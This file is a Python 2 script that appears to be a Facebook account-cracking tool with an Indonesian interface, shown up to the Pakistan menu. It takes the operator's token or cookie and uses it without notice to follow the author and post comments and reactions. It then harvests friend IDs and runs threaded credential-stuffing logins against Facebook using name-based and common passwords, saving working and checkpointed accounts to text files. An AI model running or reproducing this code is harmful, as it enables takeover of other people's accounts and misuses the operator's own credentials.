#!/usr/bin/python2
# coding=utf-8
import os,re,sys,itertools,time,requests,random,threading,json,random
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
reload(sys)
sys.setdefaultencoding('utf8')

#### LOADING ####
os.system('clear')
done = False
def animate():
    for c in itertools.cycle(['\033[0;97m|', '\033[0;97m/', '\033[0;97m-', '\033[0;97m\\']):
        if done:
            break
        sys.stdout.write('\r\033[0;97m' + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c )
        sys.stdout.flush()
        time.sleep(0.1)
 
t = threading.Thread(target=animate)
t.start()
 
time.sleep(5)
done = True

### KELUAR ###
def keluar():
	print ("! Exit")
	os.sys.exit()
	
### JALAN ###
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
		
### LOGO ###
logo = ("""
\033[0;94m╔═══════════════════════════════════════════════════════════════╗
\033[0;97m            ╔═╗╦═╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔═╗╔═╗╔╗ ╔═╗╔═╗╦╔═
\033[0;97m     \033[0;94m•\033[0;95m•\033[0;96m•\033[0;95m•\033[0;94m•  \033[0;97m║  ╠╦╝╠═╣║  ╠╩╗  ╠╣ ╠═╣║  ║╣ ╠╩╗║ ║║ ║╠╩╗  \033[0;94m•\033[0;95m•\033[0;96m•\033[0;95m•\033[0;94m•
\033[0;97m            ╚═╝╩╚═╩ ╩╚═╝╩ ╩  ╚  ╩ ╩╚═╝╚═╝╚═╝╚═╝╚═╝╩ ╩
\033[0;94m╚═══════════════════════════════════════════════════════════════╝
\033[0;94m╔═══════════════════════════════════════════════════════════════╗
\033[0;94m   {\033[0;97m•\033[0;94m} \033[0;97mAuthor   \033[0;94m: \033[0;97mDapunta Khurayra X
\033[0;94m   {\033[0;97m•\033[0;94m} \033[0;97mGithub   \033[0;94m: \033[0;97mGithub.com/Dapunta/crackfb
\033[0;94m   {\033[0;97m•\033[0;94m} \033[0;97mFacebook \033[0;94m: \033[0;97mFacebook.com/Dapunta.Khurayra.X
\033[0;94m╚═══════════════════════════════════════════════════════════════╝
""")

back = 0
threads = []
OK = []
CP = []
oks = []
oke = []
id = []
fbid = []

##### MASUK #####
def masuk():
	os.system('clear')
	print logo
	print ('\033[0;94m╔═══════════════════════════════════════════════════════════════╗')
	print ('\033[0;97m   1.\033[0;97m Login Via Token Facebook')
	print ('\033[0;97m   2.\033[0;97m Login Via Cookie Facebook')
	print ('\033[0;97m   0.\033[0;97m Keluar')
	print ('\033[0;94m╚═══════════════════════════════════════════════════════════════╝')
	pilih_masuk()

#### PILIH MASUK ####
def pilih_masuk():
	msuk = raw_input('\033[0;97m   >\033[0;97m ')
	if msuk =="":
		print '\033[0;97m   ! Isi Yg Benar'
		pilih_masuk()
	elif msuk =="1":
		login_token()
	elif msuk =="2":
		login_cookie()
	elif msuk =="0":
		keluar()
	else:
		print"\033[0;97m   ! Isi Yg Benar"
		pilih_masuk()
			
#### LOGIN_TOKEN ####
def login_token():
	os.system('clear')
	print logo
	print '\033[0;94m╔═══════════════════════════════════════════════════════════════╗'
	toket = raw_input("\033[0;97m   •\033[0;97m Token \033[0;97m:\033[0;97m ")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		print '\033[0;97m   √ Login Berhasil'
		bot_komen()
	except KeyError:
		print '\033[1;97m   ! Token salah '
		time.sleep(1.7)
		masuk()
	except requests.exceptions.SSLError:
		print '   ! Koneksi Bermasalah'
		exit()
		
#### LOGIN COOKIES ####
def login_cookie():
	os.system('clear')
	print logo
	print ("\033[0;94m╔═══════════════════════════════════════════════════════════════╗")
	try:
		cookie = raw_input("\033[0;97m   •\033[0;97m Cookie \033[0;97m:\033[0;97m ")
		data = {
		            'user-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', # don't change this user agent.
			        'referer' : 'https://m.facebook.com/',
			        'host' : 'm.facebook.com',
			        'origin' : 'https://m.facebook.com',
			        'upgrade-insecure-requests' : '1',
			        'accept-language' : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
			        'cache-control' : 'max-age=0',
			        'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			        'content-type' : 'text/html; charset=utf-8',
			         'cookie' : cookie }
		coki = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = data)
		cari = re.search('(EAAA\w+)', coki.text)
		hasil = cari.group(1)
		zedd = open("login.txt", 'w')
		zedd.write(hasil)
		zedd.close()
		print '\033[0;97m   √ Login Berhasil'
		time.sleep(2)
		bot_komen()
	except AttributeError:
		print '\033[0;97m   ! Cookie Salah'
		time.sleep(2)
		masuk()
	except UnboundLocalError:
		print '\033[0;97m   ! Cookie Salah'
		time.sleep(2)
		masuk()
	except requests.exceptions.SSLError:
		os.system('clear')
		print '\033[0;97m   ! Koneksi Bermasalah'
		exit()

#### BOT KOMEN ####
def bot_komen():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m   [!] Token invalid"
		os.system('rm -rf login.txt')
	kom = ('Sukses Selalu Bang! 😘')
	reac = ('LOVE')
	post = ('10215192646369292')
	post2 = ('10215301558092017')
	kom2 = ('Sukses Selalu Bang! 😘')
	reac2 = ('LOVE')
        requests.post('https://graph.facebook.com/1827084332/subscribers?access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
	menu()

#### MENU ####
def menu():
	os.system('clear')
	try:
		toket = open('login.txt','r').read()
	except IOError:
		print '\033[0;97m   ! Token Invalid '
		os.system('clear')
		os.system('rm -rf login.txt')
		masuk()
	try:
		otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print '\033[0;97m   ! Token invalid'
		os.system('rm -rf login.txt')
		time.sleep(1)
		masuk()
		time.sleep(1)
		masuk()
	except requests.exceptions.ConnectionError:
		print '\033[0;97m   ! Tidak ada koneksi'
		keluar()
	os.system("clear")
	print (logo)
	print ("\033[0;94m╔═══════════════════════════════════════════════════════════════╗")
	jalan ("\033[0;97m   •\033[0;97m WELCOME\033[0;97m =>\033[0;97m " +nama)
	jalan ("\033[0;97m   •\033[0;97m USER ID\033[0;97m =>\033[0;97m " +id)
	print ("\033[0;94m╚═══════════════════════════════════════════════════════════════╝")
        print ("\033[0;94m╔═══════════════════════════════════════════════════════════════╗")
	print ('\033[0;97m   1.\033[0;97m Crack ID Dari Teman/Publik')
	print ('\033[0;97m   2.\033[0;97m Crack ID Dari Like Teman/Publik')
	print ('\033[0;97m   3.\033[0;97m Crack ID Dari Followers')
	print ('\033[0;97m   4.\033[0;97m Cari ID Menggunakan Username')
	print ('\033[0;97m   5.\033[0;97m Lihat Hasil Crack')
	print ('\033[0;97m   6.\033[0;97m Perbarui Script')
	print ('\033[0;97m   0.\033[0;97m Keluar Akun')
	print ("\033[0;94m╚═══════════════════════════════════════════════════════════════╝")
	pilih_menu()
	
### PILIH MENU ###
def pilih_menu():
	peler = raw_input('\033[0;97m   >\033[0;97m ')
	if peler =="":
		print '\033[0;97m   ! Isi Yg Benar'
		pilih_menu()
	elif peler == "1":
		crack_teman()
	elif peler == "2":
		crack_like()
	elif peler == "3":
		crack_follow()
	elif peler == "4":
		cari_id()
	elif peler == "5":
		hasil_crack()
	elif peler == "6":
		perbarui()
	elif peler == "0":
		print '\033[0;97m   Menghaspus Token ...'
		time.sleep(1)
		os.system('rm -rf login.txt')
		keluar()
	else:
		print '\033[0;97m   ! Isi Yg Benar'
		pilih_menu()
		
##### CRACK TEMAN/PUBLIK #####
def crack_teman():
	os.system("clear")
	print (logo)
	print ("\033[0;94m╔═══════════════════════════════════════════════════════════════╗")
	print ('\033[0;97m   1.\033[0;97m Crack ID Indonesia')
	print ('\033[0;97m   2.\033[0;97m Crack ID Bangladesh')
	print ('\033[0;97m   3.\033[0;97m Crack ID Pakistan')
	print ('\033[0;97m   4.\033[0;97m Crack ID Usa')
	print ('\033[0;97m   0.\033[0;97m Kembali')
	print ("\033[0;94m╚═══════════════════════════════════════════════════════════════╝")
	pilih_teman()
	
### PILIH TEMAN ###
def pilih_teman():
	uki = raw_input('\033[0;97m   >\033[0;97m ')
	if uki =="":
		print '\033[0;97m   ! Isi Yg Benar'
		pilih_teman()
	elif uki == "1":
		crack_indo()
	elif uki == "2":
		crack_bangla()
	elif uki == "3":
		crack_pakis()
	elif uki == "4":
		crack_usa()
	elif uki == "0":
		menu()
	else:
		print '\033[0;97m   ! Isi Yg Benar'
		pilih_teman()

##### CRACK INDONESIA #####
def crack_indo():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print '\033[0;97m   ! Token Invalid'
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print ("\033[0;94m╔═══════════════════════════════════════════════════════════════╗")
	print ('\033[0;97m   1.\033[0;97m Crack Dari Daftar Teman')
	print ('\033[0;97m   2.\033[0;97m Crack Dari Publik/Teman')
	print ('\033[0;97m   0.\033[0;97m Kembali')
	print ("\033[0;94m╚═══════════════════════════════════════════════════════════════╝")
	pilih_indo()

#### PILIH INDONESIA ####
def pilih_indo():
	teak = raw_input('\033[0;97m   >\033[0;97m ')
	if teak =="":
		print '\033[0;97m   ! Isi Yg Benar'
		pilih_indo()
	elif teak =="1":
		os.system('clear')
		print logo
		print ("\033[0;94m╔═══════════════════════════════════════════════════════════════╗")
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2":
		os.system('clear')
		print logo
		print ("\033[0;94m╔═══════════════════════════════════════════════════════════════╗")
		idt = raw_input("\033[0;97m   • \033[0;97mID Publik/Teman \033[0;97m:\033[0;97m ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			sp = json.loads(pok.text)
			print "\033[0;97m   •\033[0;97m Nama \033[0;97m:\033[0;97m "+sp["name"]
		except KeyError:
			print "\033[0;97m   ! ID publik/teman tidak ada"
			raw_input("\n\033[1;97m   < \033[0;97mKembali \033[0;97m>")
			crack_indo()
		except requests.exceptions.ConnectionError:
			print '\033[0;97m   ! Tidak ada koneksi'
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="0" or teak =="00":
		crack_teman()
	else:
		print '\033[0;97m   ! Isi Yg Benar'
		pilih_indo()
	
	print '\033[0;97m   • \033[0;97mJumlah ID\033[0;97m :\033[0;97m '+str(len(id))
	print ("\033[0;94m╚═══════════════════════════════════════════════════════════════╝")
        print ("\033[0;94m╔═══════════════════════════════════════════════════════════════╗")
	
### MAIN INDONESIA ###
	def main(arg):
		global CP,oks
		em = arg
		try:
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+em+'/?access_token='+toket)
			v = json.loads(an.text)
			pw = v['first_name'].lower()+'123'
			rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"})
			xo = rex.content
			if 'mbasic_logout_button' in xo or 'save-device' in xo:
				print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pw
				oke = open('done/indo.txt', 'a')
				oke.write('\n   [OK] '+em+' • '+pw)
				oke.close()
				oks.append(em)
			else :
				if 'checkpoint' in xo:
					print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pw
					cek = open('done/indo.txt', 'a')
					cek.write('\n   [CP] '+em+' • '+pw)
					cek.close()
					CP.append(em)
				else:
					pw2 = v['first_name'].lower()+'12345'
					rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw2, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"})
					xo = rex.content
					if 'mbasic_logout_button' in xo or 'save-device' in xo:
						print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pw2
						oke = open('done/indo.txt', 'a')
						oke.write('\n   [OK] '+em+' • '+pw2)
						oke.close()
						oks.append(em)
					else:
						if 'checkpoint' in xo:
							print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pw2
							cek = open('done/indo.txt', 'a')
							cek.write('\n   [CP] '+em+' • '+pw2)
							cek.close()
							CP.append(em)
						else:
							pw3 = v['first_name'].lower()+'1234'
							rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw3, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36"})
							xo = rex.content
							if 'mbasic_logout_button' in xo or 'save-device' in xo:
								print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pw3
								oke = open('done/indo.txt', 'a')
								oke.write('\n   [OK] '+em+' • '+pw3)
								oke.close()
								oks.append(em)
							else:
								if 'checkpoint' in xo:
									print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pw3
									cek = open('done/indo.txt', 'a')
									cek.write('\n   [CP] '+em+' • '+pw3)
									cek.close()
									CP.append(em)
								else:
									pw4 = v['first_name'].lower()
									rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw4, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
									xo = rex.content
									if 'mbasic_logout_button' in xo or 'save-device' in xo:
										print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pw4
										oke = open('done/indo.txt', 'a')
										oke.write('\n   [OK] '+em+' • '+pw4)
										oke.close()
										oks.append(em)
									else:
										if 'checkpoint' in xo:
											print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pw4
											cek = open('done/indo.txt', 'a')
											cek.write('\n   [CP] '+em+' • '+pw4)
											cek.close()
											CP.append(em)
										else:
											pw5 = 'sayang'
											rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw5, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
											xo = rex.content
											if 'mbasic_logout_button' in xo or 'save-device' in xo:
												print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pw5
												oke = open('done/indo.txt', 'a')
												oke.write('\n   [OK] '+em+' • '+pw5)
												oke.close()
												oks.append(em)
											else:
												if 'checkpoint' in xo:
													print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pw5
													cek = open('done/indo.txt', 'a')
													cek.write('\n   [CP] '+em+' • '+pw5)
													cek.close()
													CP.append(em)
												else:
													pw6 = 'bismillah'
													rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw6, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
													xo = rex.content
													if 'mbasic_logout_button' in xo or 'save-device' in xo:
														print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pw6
														oke = open('done/indo.txt', 'a')
														oke.write('\n   [OK] '+em+' • '+pw6)
														oke.close()
														oks.append(em)
													else:
														if 'checkpoint' in xo:
															print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pw6
															cek = open('done/indo.txt', 'a')
															cek.write('\n   [CP] '+em+' • '+pw6)
															cek.close()
															CP.append(em)
														else:
															pw7 = '123456'
															rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw7, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
															xo = rex.content
															if 'mbasic_logout_button' in xo or 'save-device' in xo:
																print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pw7
																oke = open('done/indo.txt', 'a')
																oke.write('\n   [OK] '+em+' • '+pw7)
																oke.close()
																oks.append(em)
															else:
																if 'checkpoint' in xo:
																	print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pw7
																	cek = open('done/indo.txt', 'a')
																	cek.write('\n   [CP] '+em+' • '+pw7)
																	cek.close()
																	CP.append(em)
																else:
																	pw8 = 'anjing'
																	rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw8, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
																	xo = rex.content
																	if 'mbasic_logout_button' in xo or 'save-device' in xo:
																		print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pw8
																		oke = open('done/indo.txt', 'a')
																		oke.write('\n   [OK] '+em+' • '+pw8)
																		oke.close()
																		oks.append(em)
																	else:
																		if 'checkpoint' in xo:
																			print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pw8
																			cek = open('done/indo.txt', 'a')
																			cek.write('\n   [CP] '+em+' • '+pw8)
																			cek.close()
																			CP.append(em)
		except:
			pass
	p = ThreadPool(20)
	p.map(main, id)
	print ("\033[0;94m╚═══════════════════════════════════════════════════════════════╝")
        print ("\033[0;94m╔═══════════════════════════════════════════════════════════════╗")
	print '\033[0;97m   • \033[0;97mSelesai ...'
	print"\033[0;97m   • \033[0;97mTotal \033[0;97mOK\033[0;97m/\x1b[0;97mCP \033[0;97m: \033[0;97m"+str(len(oks))+"\033[0;97m/\033[0;97m"+str(len(CP))
	print '\033[0;97m   • \033[0;97mOK\033[0;97m/\x1b[0;97mCP \033[0;97mfile tersimpan \033[0;97m: \033[0;97mdone/indo.txt'
	print "\033[0;94m╚═══════════════════════════════════════════════════════════════╝"
	raw_input("\033[0;97m   < \033[0;97mKembali\033[0;97m >")
	os.system("python2 crackfb.py")
	
#### CRACK BANGLADESH ####
def crack_bangla():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print '\033[0;97m   ! Token Invalid'
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print ("\033[0;94m╔═══════════════════════════════════════════════════════════════╗")
	print ('\033[0;97m   1.\033[0;97m Crack Dari Daftar Teman')
	print ('\033[0;97m   2.\033[0;97m Crack Dari Publik/Teman')
	print ('\033[0;97m   0.\033[0;97m Kembali')
	print ("\033[0;94m╚═══════════════════════════════════════════════════════════════╝")
	pilih_bangla()

### PILIH BANGLADESH ###
def pilih_bangla():
	teak = raw_input('\033[0;97m   >\033[0;97m ')
	if teak =="":
		print '\033[0;97m   ! Isi Yg Benar'
		pilih_bangla()
	elif teak =="1":
		os.system('clear')
		print logo
		print ("\033[0;94m╔═══════════════════════════════════════════════════════════════╗")
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2":
		os.system('clear')
		print logo
		print ("\033[0;94m╔═══════════════════════════════════════════════════════════════╗")
		idt = raw_input("\033[0;97m   • \033[0;97mID Publik/Teman \033[0;97m:\033[0;97m ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			sp = json.loads(pok.text)
			print "\033[0;97m   •\033[0;97m Nama \033[0;97m:\033[0;97m "+sp["name"]
		except KeyError:
			print "\033[0;97m   ! ID publik/teman tidak ada"
			raw_input("\n\033[1;97m   < \033[0;97mKembali \033[0;97m>")
			crack_bangla()
		except requests.exceptions.ConnectionError:
			print '\033[0;97m   ! Tidak ada koneksi'
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="0" or teak =="00":
		crack_teman()
	else:
		print '\033[0;97m   ! Isi Yg Benar'
		pilih_bangla()
	
	print '\033[0;97m   • \033[0;97mJumlah ID\033[0;97m :\033[0;97m '+str(len(id))
	print ("\033[0;94m╚═══════════════════════════════════════════════════════════════╝")
        print ("\033[0;94m╔═══════════════════════════════════════════════════════════════╗")
	
### MAIN BANGLADESH ###
	def main(arg):
		global CP,oks
		em = arg
		try:
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+em+'/?access_token='+toket)
			v = json.loads(an.text)
			pz = v['first_name'].lower()+'123'
			rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pz, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"})
			xo = rex.content
			if 'mbasic_logout_button' in xo or 'save-device' in xo:
				print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pz
				oke = open('done/bangla.txt', 'a')
				oke.write('\n   [OK] '+em+' • '+pz)
				oke.close()
				oks.append(em)
			else :
				if 'checkpoint' in xo:
					print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pz
					cek = open('done/bangla.txt', 'a')
					cek.write('\n   [CP] '+em+' • '+pz)
					cek.close()
					CP.append(em)
				else:
					pz2 = v['first_name'].lower()+'12345'
					rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pz2, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"})
					xo = rex.content
					if 'mbasic_logout_button' in xo or 'save-device' in xo:
						print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pz2
						oke = open('done/bangla.txt', 'a')
						oke.write('\n   [OK] '+em+' • '+pz2)
						oke.close()
						oks.append(em)
					else:
						if 'checkpoint' in xo:
							print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pz2
							cek = open('done/bangla.txt', 'a')
							cek.write('\n   [CP] '+em+' • '+pz2)
							cek.close()
							CP.append(em)
						else:
							pz3 = v['first_name'].lower()+'1234'
							rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pz3, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36"})
							xo = rex.content
							if 'mbasic_logout_button' in xo or 'save-device' in xo:
								print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pz3
								oke = open('done/bangla.txt', 'a')
								oke.write('\n   [OK] '+em+' • '+pz3)
								oke.close()
								oks.append(em)
							else:
								if 'checkpoint' in xo:
									print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pz3
									cek = open('done/bangla.txt', 'a')
									cek.write('\n   [CP] '+em+' • '+pz3)
									cek.close()
									CP.append(em)
								else:
									pz4 = '786786'
									rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pz4, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
									xo = rex.content
									if 'mbasic_logout_button' in xo or 'save-device' in xo:
										print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pz4
										oke = open('done/bangla.txt', 'a')
										oke.write('\n   [OK] '+em+' • '+pz4)
										oke.close()
										oks.append(em)
									else:
										if 'checkpoint' in xo:
											print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pz4
											cek = open('done/bangla.txt', 'a')
											cek.write('\n   [CP] '+em+' • '+pz4)
											cek.close()
											CP.append(em)
										else:
											pz5 = v['first_name'].lower()+'786'
											rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pz5, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
											xo = rex.content
											if 'mbasic_logout_button' in xo or 'save-device' in xo:
												print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pz5
												oke = open('done/bangla.txt', 'a')
												oke.write('\n   [OK] '+em+' • '+pz5)
												oke.close()
												oks.append(em)
											else:
												if 'checkpoint' in xo:
													print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pz5
													cek = open('done/bangla.txt', 'a')
													cek.write('\n   [CP] '+em+' • '+pz5)
													cek.close()
													CP.append(em)
												else:
													pz6 = '000786'
													rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pz6, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
													xo = rex.content
													if 'mbasic_logout_button' in xo or 'save-device' in xo:
														print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pz6
														oke = open('done/bangla.txt', 'a')
														oke.write('\n   [OK] '+em+' • '+pz6)
														oke.close()
														oks.append(em)
													else:
														if 'checkpoint' in xo:
															print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pz6
															cek = open('done/bangla.txt', 'a')
															cek.write('\n   [CP] '+em+' • '+pz6)
															cek.close()
															CP.append(em)
														else:
															pz7 = '102030'
															rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pz7, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
															xo = rex.content
															if 'mbasic_logout_button' in xo or 'save-device' in xo:
																print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pz7
																oke = open('done/bangla.txt', 'a')
																oke.write('\n   [OK] '+em+' • '+pz7)
																oke.close()
																oks.append(em)
															else:
																if 'checkpoint' in xo:
																	print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pz7
																	cek = open('done/bangla.txt', 'a')
																	cek.write('\n   [CP] '+em+' • '+pz7)
																	cek.close()
																	CP.append(em)
		except:
			pass
	p = ThreadPool(20)
	p.map(main, id)
	print ("\033[0;94m╚═══════════════════════════════════════════════════════════════╝")
        print ("\033[0;94m╔═══════════════════════════════════════════════════════════════╗")
	print '\033[0;97m   • \033[0;97mSelesai ...'
	print"\033[0;97m   • \033[0;97mTotal \033[0;97mOK\033[0;97m/\x1b[0;97mCP \033[0;97m: \033[0;97m"+str(len(oks))+"\033[0;97m/\033[0;97m"+str(len(CP))
	print '\033[0;97m   • \033[0;97mOK\033[0;97m/\x1b[0;97mCP \033[0;97mfile tersimpan \033[0;97m: \033[0;97mdone/bangla.txt'
	print "\033[0;94m╚═══════════════════════════════════════════════════════════════╝"
	raw_input("\033[0;97m   < \033[0;97mKembali\033[0;97m >")
	os.system("python2 crackfb.py")
	
#### CRACK PAKISTAN ####
def crack_pakis():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print '\033[0;97m! Token Invalid'
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print ("\033[0;94m╔═══════════════════════════════════════════════════════════════╗")
	print ('\033[0;97m   1.\033[0;97m Crack Dari Daftar Teman')
	print ('\033[0;97m   2.\033[0;97m Crack Dari Publik/Teman')
	print ('\033[0;97m   0.\033[0;97m Kembali')
	print ("\033[0;94m╚═══════════════════════════════════════════════════════════════╝")
	pilih_pakis()

